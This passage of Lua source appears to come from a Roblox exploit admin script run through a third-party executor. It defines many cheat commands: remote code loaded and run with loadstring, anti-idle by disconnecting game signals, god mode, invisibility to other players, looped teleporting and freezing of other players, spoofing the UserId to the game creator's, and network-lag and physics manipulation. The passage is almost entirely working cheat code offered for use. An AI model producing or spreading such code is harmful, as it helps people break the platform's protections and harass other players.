	addcmd('deleteinvisparts',{'deleteinvisibleparts','dip'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency == 1 and v.CanCollide then
				v:Destroy()
			end
		end
	end)

	local shownParts = {}
	addcmd('invisibleparts',{'invisparts'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") and v.Transparency == 1 then
				if not table.find(shownParts,v) then
					table.insert(shownParts,v)
				end
				v.Transparency = 0
			end
		end
	end)

	addcmd('uninvisibleparts',{'uninvisparts'},function(args, speaker)
		for i,v in pairs(shownParts) do
			v.Transparency = 1
		end
		shownParts = {}
	end)

	addcmd('btools',{},function(args, speaker)
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 1
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 2
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 3
		Instance.new("HopperBin", speaker:FindFirstChildOfClass("Backpack")).BinType = 4
	end)

	addcmd('f3x',{'fex'},function(args, speaker)
		loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
	end)

	addcmd('partpath',{'partname'},function(args, speaker)
		selectPart()
	end)

	addcmd('antiafk',{'antiidle'},function(args, speaker)
		local GC = getconnections or get_signal_cons
		if GC then
			for i,v in pairs(GC(Players.LocalPlayer.Idled)) do
				if v["Disable"] then
					v["Disable"](v)
				elseif v["Disconnect"] then
					v["Disconnect"](v)
				end
			end
			notify('Anti Idle','Anti idle is enabled')
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing getconnections)')
		end
	end)

	addcmd('datalimit',{},function(args, speaker)
		if tonumber(args[1]) then
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(args[1])
		end
	end)

	addcmd('replicationlag',{'backtrack'},function(args, speaker)
		if tonumber(args[1]) then
			settings():GetService("NetworkSettings").IncomingReplicationLag = args[1]
		end
	end)

	addcmd('noprompts', {'nopurchaseprompts'}, function(args, speaker)
		COREGUI.PurchasePromptApp.Enabled = false
	end)

	addcmd('showprompts', {'showpurchaseprompts'}, function(args, speaker)
		COREGUI.PurchasePromptApp.Enabled = true
	end)

	addcmd('age',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
		notify('Account Age',table.concat(ages, ',\n'))
	end)

	addcmd('chatage',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local ages = {}
		for i,v in pairs(players) do
			local p = Players[v]
			table.insert(ages, p.Name.."'s age is: "..p.AccountAge)
		end
		local chatString = table.concat(ages, ', ')
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
	end)

	addcmd('joindate',{'jd'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local dates = {}
		notify("Loading",'Hold on a sec')
		for i,v in pairs(players) do
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..Players[v].UserId)
			local json = game:GetService("HttpService"):JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			table.insert(dates,Players[v].Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
		end
		notify('Join Date (Month/Day/Year)',table.concat(dates, ',\n'))
	end)

	addcmd('chatjoindate',{'cjd'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		local dates = {}
		notify("Loading",'Hold on a sec')
		for i,v in pairs(players) do
			local user = game:HttpGet("https://users.roblox.com/v1/users/"..Players[v].UserId)
			local json = game:GetService("HttpService"):JSONDecode(user)
			local date = json["created"]:sub(1,10)
			local splitDates = string.split(date,"-")
			table.insert(dates,Players[v].Name.." joined: "..splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
		end
		local chatString = table.concat(dates, ', ')
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chatString, "All")
	end)

	addcmd('copyname',{'copyuser'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local name = tostring(Players[v].Name)
			toClipboard(name)
		end
	end)

	addcmd('userid',{'id'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local id = tostring(Players[v].UserId)
			notify('User ID',id)
		end
	end)

	addcmd('copyid',{'copyuserid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local id = tostring(Players[v].UserId)
			toClipboard(id)
		end
	end)

	addcmd('creatorid',{'creator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			notify('Creator ID',game.CreatorId)
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
			speaker.UserId = OwnerID
			notify('Creator ID',OwnerID)
		end
	end)

	addcmd('copycreatorid',{'copycreator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			toClipboard(game.CreatorId)
			notify('Copied ID','Copied creator ID to clipboard')
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
			toClipboard(OwnerID)
			notify('Copied ID','Copied creator ID to clipboard')
		end
	end)

	addcmd('setcreatorid',{'setcreator'},function(args, speaker)
		if game.CreatorType == Enum.CreatorType.User then
			speaker.UserId = game.CreatorId
			notify('Set ID','Set UserId to '..game.CreatorId)
		elseif game.CreatorType == Enum.CreatorType.Group then
			local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
			speaker.UserId = OwnerID
			notify('Set ID','Set UserId to '..OwnerID)
		end
	end)

	addcmd('appearanceid',{'aid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local aid = tostring(Players[v].CharacterAppearanceId)
			notify('Appearance ID',aid)
		end
	end)

	addcmd('copyappearanceid',{'caid'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			local aid = tostring(Players[v].CharacterAppearanceId)
			toClipboard(aid)
		end
	end)

	addcmd('goto',{'to'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				getRoot(speaker.Character).CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)
			end
		end
		execCmd('breakvelocity')
	end)

	addcmd('tweengoto',{'tgoto','tto','tweento'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = getRoot(Players[v].Character).CFrame + Vector3.new(3,1,0)}):Play()
			end
		end
		execCmd('breakvelocity')
	end)

	addcmd('vehiclegoto',{'vgoto','vtp','vehicletp'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				local seat = speaker.Character.Humanoid.SeatPart
				local vehicleModel = seat.Parent
				repeat
					if vehicleModel.ClassName ~= "Model" then
						vehicleModel = vehicleModel.Parent
					end
				until vehicleModel.ClassName == "Model"
				wait(0.1)
				vehicleModel:MoveTo(getRoot(Players[v].Character).Position)
			end
		end
	end)

	local vnoclipParts = {}
	addcmd('vehiclenoclip',{'vnoclip'},function(args, speaker)
		vnoclipParts = {}
		local seat = speaker.Character.Humanoid.SeatPart
		local vehicleModel = seat.Parent
		repeat
			if vehicleModel.ClassName ~= "Model" then
				vehicleModel = vehicleModel.Parent
			end
		until vehicleModel.ClassName == "Model"
		wait(0.1)
		execCmd('noclip')
		for i,v in pairs(vehicleModel:GetDescendants()) do
			if v:IsA("BasePart") and v.CanCollide then
				table.insert(vnoclipParts,v)
				v.CanCollide = false
			end
		end
	end)

	addcmd('vehicleclip',{'vclip','unvnoclip','unvehiclenoclip'},function(args, speaker)
		execCmd('clip')
		for i,v in pairs(vnoclipParts) do
			v.CanCollide = true
		end
		vnoclipParts = {}
	end)

	addcmd('togglevnoclip',{},function(args, speaker)
		if Clip then
			execCmd('vnoclip')
		else
			execCmd('vclip')
		end
	end)

	addcmd('clientbring',{'cbring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if Players[v].Character:FindFirstChild("Humanoid") then
					Players[v].Character:FindFirstChildOfClass('Humanoid').Sit = false
				end
				wait()
				getRoot(Players[v].Character).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(3,1,0)
			end
		end
	end)

	local bringT = {}
	addcmd('loopbring',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				if Players[v].Name ~= speaker.Name and not FindInTable(bringT, Players[v].Name) then
					table.insert(bringT, Players[v].Name)
					local plrName = Players[v].Name
					local pchar=Players[v].Character
					local distance = 3
					if args[2] and isNumber(args[2]) then
						distance = args[2]
					end
					local lDelay = 0
					if args[3] and isNumber(args[3]) then
						lDelay = args[3]
					end
					repeat
						for i,c in pairs(players) do
							if Players:FindFirstChild(v) then
								pchar = Players[v].Character
								if pchar~= nil and Players[v].Character ~= nil and getRoot(pchar) and speaker.Character ~= nil and getRoot(speaker.Character) then
									getRoot(pchar).CFrame = getRoot(speaker.Character).CFrame + Vector3.new(distance,1,0)
								end
								wait(lDelay)
							else 
								for a,b in pairs(bringT) do if b == plrName then table.remove(bringT, a) end end
							end
						end
					until not FindInTable(bringT, plrName)
				end
			end)
		end
	end)

	addcmd('unloopbring',{'noloopbring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for a,b in pairs(bringT) do if b == Players[v].Name then table.remove(bringT, a) end end
			end)
		end
	end)

	local walkto
	addcmd('walkto',{'follow'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				walkto = true
				repeat wait()
					speaker.Character.Humanoid:MoveTo(getRoot(Players[v].Character).Position)
				until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
			end
		end
	end)

	addcmd('pathfindwalkto',{'pathfindfollow'},function(args, speaker)
		walkto = false
		wait()
		local players = getPlayer(args[1], speaker)
		local PathService = game:GetService("PathfindingService")
		local hum = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		local path = PathService:CreatePath()
		for i,v in pairs(players)do
			if Players[v].Character ~= nil then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				walkto = true
				repeat wait()
					local success, response = pcall(function()
						path:ComputeAsync(getRoot(speaker.Character).Position, getRoot(Players[v].Character).Position)
						local waypoints = path:GetWaypoints()
						local distance 
						for waypointIndex, waypoint in pairs(waypoints) do
							local waypointPosition = waypoint.Position
							hum:MoveTo(waypointPosition)
							repeat 
								distance = (waypointPosition - hum.Parent.PrimaryPart.Position).magnitude
								wait()
							until
							distance <= 5
						end	 
					end)
					if not success then
						speaker.Character.Humanoid:MoveTo(getRoot(Players[v].Character).Position)
					end
				until Players[v].Character == nil or not getRoot(Players[v].Character) or walkto == false
			end
		end
	end)

	addcmd('unwalkto',{'nowalkto','unfollow','nofollow'},function(args, speaker)
		walkto = false
	end)

	addcmd('freeze',{'fr'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("BasePart") and not x.Anchored then
							x.Anchored = true
						end
					end
				end)
			end
		end
	end)

	addcmd('thaw',{'unfreeze','unfr'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("BasePart") and x.Anchored then
							x.Anchored = false
						end
					end
				end)
			end
		end
	end)

	oofing = false
	addcmd('loopoof',{},function(args, speaker)
		oofing = true
		repeat wait(0.1)
			for i,v in pairs(Players:GetPlayers()) do
				if v.Character ~= nil and v.Character:FindFirstChild'Head' then
					for _,x in pairs(v.Character.Head:GetChildren()) do
						if x:IsA'Sound' then x.Playing = true end
					end
				end
			end
		until oofing == false
	end)

	addcmd('unloopoof',{},function(args, speaker)
		oofing = false
	end)

	local notifiedRespectFiltering = false
	addcmd('muteboombox',{},function(args, speaker)
		if not notifiedRespectFiltering and game:GetService("SoundService").RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("Sound") and x.Playing == true then
							x.Playing = false
						end
					end
					for i, x in next, Players[v]:FindFirstChildOfClass("Backpack"):GetDescendants() do
						if x:IsA("Sound") and x.Playing == true then
							x.Playing = false
						end
					end
				end)
			end
		end
	end)

	addcmd('unmuteboombox',{},function(args, speaker)
		if not notifiedRespectFiltering and game:GetService("SoundService").RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("Sound") and x.Playing == false then
							x.Playing = true
						end
					end
				end)
			end
		end
	end)

	addcmd('reset',{},function(args, speaker)
		speaker.Character:BreakJoints()
	end)

	addcmd('respawn',{},function(args, speaker)
		respawn(speaker)
	end)

	addcmd('refresh',{'re'},function(args, speaker)
		refresh(speaker)
	end)

	addcmd('god',{},function(args, speaker)
		local Cam = workspace.CurrentCamera
		local Pos, Char = Cam.CFrame, speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		local nHuman = Human.Clone(Human)
		nHuman.Parent, speaker.Character = Char, nil
		nHuman.SetStateEnabled(nHuman, 15, false)
		nHuman.SetStateEnabled(nHuman, 1, false)
		nHuman.SetStateEnabled(nHuman, 0, false)
		nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
		speaker.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
		nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		local Script = Char.FindFirstChild(Char, "Animate")
		if Script then
			Script.Disabled = true
			wait()
			Script.Disabled = false
		end
		nHuman.Health = nHuman.MaxHealth
	end)

	invisRunning = false
	addcmd('invisible',{'invis'},function(args, speaker)
		if invisRunning then return end
		invisRunning = true
		-- Full credit to AmokahFox @V3rmillion
		local Player = speaker
		repeat wait(.1) until Player.Character
		local Character = Player.Character
		Character.Archivable = true
		local IsInvis = false
		local IsRunning = true
		local InvisibleCharacter = Character:Clone()
		InvisibleCharacter.Parent = game:GetService'Lighting'
		local Void = workspace.FallenPartsDestroyHeight
		InvisibleCharacter.Name = ""
		local CF

		local invisFix = game:GetService("RunService").Stepped:Connect(function()
			pcall(function()
				local IsInteger
				if tostring(Void):find'-' then
					IsInteger = true
				else
					IsInteger = false
				end
				local Pos = Player.Character.HumanoidRootPart.Position
				local Pos_String = tostring(Pos)
				local Pos_Seperate = Pos_String:split(', ')
				local X = tonumber(Pos_Seperate[1])
				local Y = tonumber(Pos_Seperate[2])
				local Z = tonumber(Pos_Seperate[3])
				if IsInteger == true then
					if Y <= Void then
						Respawn()
					end
				elseif IsInteger == false then
					if Y >= Void then
						Respawn()
					end
				end
			end)
		end)

		for i,v in pairs(InvisibleCharacter:GetDescendants())do
			if v:IsA("BasePart") then
				if v.Name == "HumanoidRootPart" then
					v.Transparency = 1
				else
					v.Transparency = .5
				end
			end
		end

		function Respawn()
			IsRunning = false
			if IsInvis == true then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					IsInvis = false
					InvisibleCharacter.Parent = nil
					invisRunning = false
				end)
			elseif IsInvis == false then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					TurnVisible()
				end)
			end
		end

		local invisDied
		invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			Respawn()
			invisDied:Disconnect()
		end)

		if IsInvis == true then return end
		IsInvis = true
		CF = workspace.CurrentCamera.CFrame
		local CF_1 = Player.Character.HumanoidRootPart.CFrame
		Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
		wait(.2)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
		InvisibleCharacter = InvisibleCharacter
		Character.Parent = game:GetService'Lighting'
		InvisibleCharacter.Parent = workspace
		InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
		Player.Character = InvisibleCharacter
		execCmd('fixcam')
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false

		function TurnVisible()
			if IsInvis == false then return end
			invisFix:Disconnect()
			invisDied:Disconnect()
			CF = workspace.CurrentCamera.CFrame
			Character = Character
			local CF_1 = Player.Character.HumanoidRootPart.CFrame
			Character.HumanoidRootPart.CFrame = CF_1
			InvisibleCharacter:Destroy()
			Player.Character = Character
			Character.Parent = workspace
			IsInvis = false
			Player.Character.Animate.Disabled = true
			Player.Character.Animate.Disabled = false
			invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				Respawn()
				invisDied:Disconnect()
			end)
			invisRunning = false
		end
		notify('Invisible','You now appear invisible to other players')
	end)

	addcmd('visible',{'vis'},function(args, speaker)
		TurnVisible()
	end)

	addcmd('toggleinvis',{},function(args, speaker)
		if invisRunning then
			execCmd('visible')
		else
			execCmd('invisible')
		end
	end)

	addcmd('toolinvisible',{'toolinvis','tinvis'},function(args, speaker)
		local Char  = Players.LocalPlayer.Character
		local touched = false
		local tpdback = false
		local box = Instance.new('Part')
		box.Anchored = true
		box.CanCollide = true
		box.Size = Vector3.new(10,1,10)
		box.Position = Vector3.new(0,10000,0)
		box.Parent = workspace
		local boxTouched = box.Touched:connect(function(part)
			if (part.Parent.Name == Players.LocalPlayer.Name) then
				if touched == false then
					touched = true
					local function apply()
						local no = Char.HumanoidRootPart:Clone()
						wait(.25)
						Char.HumanoidRootPart:Destroy()
						no.Parent = Char
						Char:MoveTo(loc)
						touched = false
					end
					if Char then
						apply()
					end
				end
			end
		end)
		repeat wait() until Char
		local cleanUp
		cleanUp = Players.LocalPlayer.CharacterAdded:connect(function(char)
			boxTouched:Disconnect()
			box:Destroy()
			cleanUp:Disconnect()
		end)
		loc = Char.HumanoidRootPart.Position
		Char:MoveTo(box.Position + Vector3.new(0,.5,0))
	end)

	addcmd('strengthen',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				if args[1] then
					child.CustomPhysicalProperties = PhysicalProperties.new(args[1], 0.3, 0.5)
				else
					child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
				end
			end
		end
	end)

	addcmd('weaken',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				if args[1] then
					child.CustomPhysicalProperties = PhysicalProperties.new(-args[1], 0.3, 0.5)
				else
					child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
				end
			end
		end
	end)

	addcmd('unweaken',{'unstrengthen'},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
	end)

	addcmd('breakvelocity', {}, function(args, speaker)
		local BeenASecond, V3 = false, Vector3.new(0, 0, 0)
		delay(1, function()
			BeenASecond = true
		end)
		while not BeenASecond do
			for _, v in ipairs(speaker.Character:GetDescendants()) do
				if v.IsA(v, "BasePart") then
					v.Velocity, v.RotVelocity = V3, V3
				end
			end
			wait()
		end
	end)

	addcmd('jpower',{'jumppower','jp'},function(args, speaker)
		local jpower = args[1] or 50
		if isNumber(jpower) then
			speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = jpower
		end
	end)

	addcmd('maxslopeangle',{'msa'},function(args, speaker)
		local sangle = args[1] or 89
		if isNumber(sangle) then
			speaker.Character:FindFirstChildOfClass('Humanoid').MaxSlopeAngle = sangle
		end
	end)

	addcmd('gravity',{'grav'},function(args, speaker)
		local grav = args[1] or 196.2
		if isNumber(grav) then
			workspace.Gravity = grav
		end
	end)

	addcmd('hipheight',{'hheight'},function(args, speaker)
		local height
		if r15(speaker) then
			height = args[1] or 2.1
		else
			height = args[1] or 0
		end
		speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight = height
	end)

	addcmd('dance', {}, function(args, speaker)
		if not r15(speaker) then
			local dances = {"27789359", "30196114", "248263260", "45834924", "33796059", "28488254", "52155728"}
			local animation = Instance.new("Animation")
			animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
			animTrack = speaker.Character.Humanoid:LoadAnimation(animation)
			animTrack:Play()
		else
			notify('R6 Required', 'This command requires the r6 rig type')
		end
	end)

	addcmd('undance',{'nodance'},function(args, speaker)
		animTrack:Stop()
		animTrack:Destroy()
	end)

	addcmd('nolimbs',{'rlimbs'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperLeg" or
					v.Name == "LeftUpperLeg" or
					v.Name == "RightUpperArm" or
					v.Name == "LeftUpperArm" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Leg" or
					v.Name == "Left Leg" or
					v.Name == "Right Arm" or
					v.Name == "Left Arm" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('nohead',{'rhead','headless'},function(args, speaker)
		if sethidden then
			-- Full credit to Thomas_Cornez#0272 @Discord
			local lplr = Players.LocalPlayer
			local char = lplr.Character
			local rig = tostring(char.Humanoid.RigType) == "Enum.HumanoidRigType.R6" and 1 or tostring(char.Humanoid.RigType) == "Enum.HumanoidRigType.R15" and 2

			local speaker = Players.LocalPlayer

			sethidden(speaker, "SimulationRadius", math.huge)

			local test = Instance.new("Model")
			local hum  = Instance.new("Humanoid")
			local animation = Instance.new("Model")
			local humanoidanimation = Instance.new("Humanoid")
			test.Parent = workspace
			hum.Parent = test
			animation.Parent = workspace
			humanoidanimation.Parent = animation

			lplr.Character = test
			wait(2)
			char.Humanoid.Animator.Parent = humanoidanimation
			char.Humanoid:Destroy()

			char.Head:Destroy()
			wait(5)
			game.Players.LocalPlayer.Character = char

			local hum2 = Instance.new("Humanoid")
			hum2.Parent = char
			char:FindFirstChildOfClass("Humanoid").Jump = true

			humanoidanimation.Animator.Parent = hum2
			char.Animate.Disabled = true
			wait()
			char.Animate.Disabled = false
			wait()

			if rig == 1 then
				hum2.HipHeight = 0
			elseif rig == 2 then
				hum2.HipHeight = 2.19
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('noarms',{'rarms'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperArm" or
					v.Name == "LeftUpperArm" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Arm" or
					v.Name == "Left Arm" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('nolegs',{'rlegs'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperLeg" or
					v.Name == "LeftUpperLeg" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Leg" or
					v.Name == "Left Leg" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('sit',{},function(args, speaker)
		speaker.Character:FindFirstChildOfClass("Humanoid").Sit = true
	end)

	addcmd('sitwalk',{},function(args, speaker)
		local anims = speaker.Character.Animate
		local sit = anims.sit:FindFirstChildOfClass("Animation").AnimationId
		anims.idle:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.walk:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.run:FindFirstChildOfClass("Animation").AnimationId = sit
		anims.jump:FindFirstChildOfClass("Animation").AnimationId = sit
		if r15(speaker) then
			speaker.Character.Humanoid.HipHeight = 0.5
		else
			speaker.Character.Humanoid.HipHeight = -1.5
		end
	end)

	function noSitFunc()
		wait()
		if Players.LocalPlayer.Character.Humanoid.Sit then
			Players.LocalPlayer.Character.Humanoid.Sit = false
		end
	end
	addcmd('nosit',{},function(args, speaker)
		if noSit then noSit:Disconnect() nositDied:Disconnect() end
		noSit = Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
		local function nositDiedFunc()
			repeat wait() until speaker.Character ~= nil and speaker.Character:FindFirstChild('Humanoid')
			noSit:Disconnect()
			noSit = Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
		end
		nositDied = speaker.CharacterAdded:Connect(nositDiedFunc)
	end)

	addcmd('unnosit',{},function(args, speaker)
		if noSit then noSit:Disconnect() nositDied:Disconnect() end
	end)

	addcmd('jump',{},function(args, speaker)
		speaker.Character:FindFirstChildOfClass("Humanoid").Jump = true
	end)

	addcmd('infjump',{'infinitejump'},function(args, speaker)
		infJump = true
	end)

	addcmd('uninfjump',{'uninfinitejump','noinfjump','noinfinitejump'},function(args, speaker)
		infJump = false
	end)

	local flyjump
	addcmd('flyjump',{},function(args, speaker)
		if flyjump then flyjump:Disconnect() end
		flyjump = UserInputService.JumpRequest:Connect(function(Jump)
			game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
		end)
	end)

	addcmd('unflyjump',{'noflyjump'},function(args, speaker)
		if flyjump then flyjump:Disconnect() end
	end)

	local HumanModCons = {}
	addcmd('autojump',{'ajump'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		local function autoJump()
			if Char and Human then
				local check1 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position-Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
				local check2 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position+Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
				if check1 or check2 then
					Human.Jump = true
				end
			end
		end
		autoJump()
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
		HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			autoJump()
			HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(autoJump)
		end)
	end)

	addcmd('unautojump',{'noautojump', 'noajump', 'unajump'},function(args, speaker)
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or nil
		HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or nil
	end)

	addcmd('edgejump',{'ejump'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		-- Full credit to NoelGamer06 @V3rmillion
		local state
		local laststate
		local lastcf
		local function edgejump()
			if Char and Human then
				laststate = state
				state = Human:GetState()
				if laststate ~= state and state == Enum.HumanoidStateType.Freefall and laststate ~= Enum.HumanoidStateType.Jumping then
					Char.HumanoidRootPart.CFrame = lastcf
					Char.HumanoidRootPart.Velocity = Vector3.new(Char.HumanoidRootPart.Velocity.X, Human.JumpPower, Char.HumanoidRootPart.Velocity.Z)
				end
				lastcf = Char.HumanoidRootPart.CFrame
			end
		end
		edgejump()
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
		HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			edgejump()
			HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or game:GetService("RunService").RenderStepped:Connect(edgejump)
		end)
	end)

